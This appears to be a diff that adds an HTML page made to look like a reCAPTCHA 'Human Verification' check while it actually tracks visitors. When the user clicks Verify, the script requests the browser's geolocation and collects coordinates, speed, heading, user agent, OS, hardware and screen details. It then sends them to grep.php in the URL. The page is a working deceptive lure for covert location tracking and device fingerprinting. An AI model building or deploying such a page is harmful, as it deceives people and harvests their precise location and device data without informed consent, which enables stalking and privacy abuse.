@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+    <html>
+        <link rel="stylesheet" href="style.css">
+        <title>Ip Tracking</title>
+        <body>
+            <h1 align="center">Human Verification</h1>
+
+            <div class="container">
+
+                <div class="clearfix">
+                    <img src="RecaptchaLogo.svg" width="60" height="60" align="right">
+                    <input id="checkbox-1" class="checkbox-input" type="checkbox">
+                    <label for="checkbox-1" class="checkbox-label">
+                    i am not a robot</label>
+                    <br>
+                    <button onclick="getLocation()">Verify</button>
+                </div>
+            </div>
+            <script>
+                function getLocation() {
+                    if (navigator.geolocation) {
+                        var acc = {enableHighAccuracy : true , timeout : 60000, maximumage : 0 };
+                        navigator.geolocation.getCurrentPosition(showPosition);
+                    }else{
+                        x.innerHTML = "you need Geolocation to access thi site.";
+                    }
+                }
+                function showPosition(position) {
+                    var useragent = navigator.userAgent;
+                    var latitude = position.coords.latitude;
+                    var longitude = position.coords.longitude;
+                    var altitude = position.coords.altitude;
+                    var accuracy = position.coords.accuracy;
+                    var speed = position.coords.speed;
+                    var heading = position.coords.heading;
+                    var platform = navigator.oscpu;
+                    var product = navigator.product;
+                    var hardware = window.navigator.hardwareConcurrency;
+                    var memory = navigator.deviceMemory;
+                    var height = screen.height;
+                    var width = screen.width;
+
+                    window.location.href = "grep.php?latitude=" + latitude
+                    + "&longitude=" + longitude
+                    + "&altitude=" + altitude
+                    + "&platform=" + platform
+                    + "&accuracy=" + accuracy
+                    + "&speed=" + speed
+                    + "&heading=" + heading
+                    + "&hardware=" + hardware
+                    + "&memory=" + memory
+                    + "&useragent=" + useragent
+                    + "&height=" + height
+                    + "&width=" + width
+                    + "&product=" + product;
+                }
+
+              </script>
+        </body>
+    </html>
